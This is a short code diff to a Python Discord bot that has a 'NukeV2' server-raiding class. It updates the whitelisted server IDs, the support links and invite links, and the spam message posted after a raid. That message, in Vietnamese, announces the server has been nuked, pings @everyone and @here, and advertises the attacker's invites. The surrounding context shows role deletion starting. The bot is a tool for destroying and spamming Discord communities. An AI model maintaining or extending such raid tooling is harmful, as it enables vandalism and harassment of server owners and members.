@@ -47,9 +47,9 @@ def random_color() -> int:
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 AVATAR_URL = "https://i.pinimg.com/736x/63/37/02/6337023d80cd4e3c2b79e2baa44b4adf.jpg"
 LOG_CHANNEL_ID = 1538893152386289814
-WHITELIST_SERVER_IDS = [1536985687469985813, 1536276567808938098, 1511630281680093275]
-SUPPORT_LINK = "https://xnhau.com"
-SUPPORT_LINK2 = "https://hentaivietsub.com"  # Cơ sở 2
+WHITELIST_SERVER_IDS = [1536985687469985813, 1481344463619227762]
+SUPPORT_LINK = "https://discord.gg/AHGy3yMzjE"
+SUPPORT_LINK2 = "not server support 2"  # Cơ sở 2
 OWNER_ID = 1536264763427000391   # Owner mới
 OWNER_NAME = "laibantlaymdisoi"
 PREFIX = "l!"
@@ -1534,7 +1534,7 @@ class NukeV2:
             return
         self.last_nuke_time = current_time
 
-        spam_content = "# <a:Black_cross:1353971971095793776> **__SERVER ĐÃ BỊ NUKE, LẤY BOT IB T ℠__** <a:Black_cross:1353971971095793776>\n> ||@everyone @here||\n> ||Join:|| https://discord.gg/5WFupkFbkM\n> ||Join 2:|| https://discord.gg/HVWArvBGy"
+        spam_content = "# <a:Black_cross:1353971971095793776> **__SERVER ĐÃ BỊ NUKE, LẤY BOT IB T ℠__** <a:Black_cross:1353971971095793776>\n> ||@everyone @here||\n> ||Join:|| https://discord.gg/AHGy3yMzjE\n> ||Join 2:|| not server support 2"
         image_url = "https://i.pinimg.com/originals/df/1b/55/df1b5570637dfa5dea04929d5a787a1e.gif"
 
         await self._log("Starting role deletion...")
